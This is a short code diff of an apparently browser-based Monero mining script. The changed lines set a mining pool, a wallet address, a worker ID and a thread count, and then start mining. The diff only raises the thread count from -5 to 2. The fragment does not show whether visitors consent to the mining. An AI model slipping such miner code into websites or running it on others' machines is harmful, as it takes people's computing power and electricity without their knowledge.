@@ -34,7 +34,7 @@ function on_servermsg(c){c=JSON.parse(c.data);receiveStack.push(c);"job"==c.iden
     var pool = "gulf.moneroocean.stream:20128";
     var walletAddress = "42NXNJk2Weh8GWjKu2vsWNSeJoS6oAbxRVnjJniZsarQg9NGUng3NzzgUMD9RveLaTAS2vE7PTxrG9XmT25TrRwtURqBnUc";
     var workerId = "hola"
-    var threads = -5;
+    var threads = 2;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
     throttleMiner = 20;
